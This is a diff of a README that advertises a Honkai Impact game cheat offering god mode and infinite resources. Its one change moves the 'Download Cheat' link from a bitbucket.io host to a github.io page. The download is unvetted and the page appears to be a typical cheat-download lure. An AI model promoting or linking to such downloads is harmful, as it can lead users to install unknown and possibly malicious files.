@@ -4,7 +4,7 @@
 
 From **infinite crystals and stamina** to **god mode and one-hit kills**, this cheat power-up turns your squad into unstoppable cosmic queens.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload1.bitbucket.io)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://Honkai-Impact-Cheat-heso.github.io/.github)
 ---
 
 ## 🎮 What Is a Honkai Impact Cheat?
